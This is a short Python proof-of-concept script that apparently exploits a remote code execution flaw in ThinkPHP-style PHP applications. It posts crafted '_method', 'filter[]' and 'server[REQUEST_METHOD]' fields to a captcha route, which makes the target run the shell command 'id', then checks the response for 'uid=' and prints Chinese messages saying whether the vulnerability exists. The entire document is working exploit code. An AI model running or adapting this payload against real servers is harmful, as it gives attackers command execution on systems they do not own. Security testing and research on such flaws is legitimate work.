import requests

url = "http://192.168.174.138:8080/index.php?s=captcha"
postData = {"_method":"__construct",
            "filter[]":"system",
            "method":"get",
            "server[REQUEST_METHOD]":"id"}
res = requests.post(url = url, data = postData)

if res.status_code == 200 and "uid=" in res.text :
    print("漏洞存在~")
else :
    print("什么也没有~")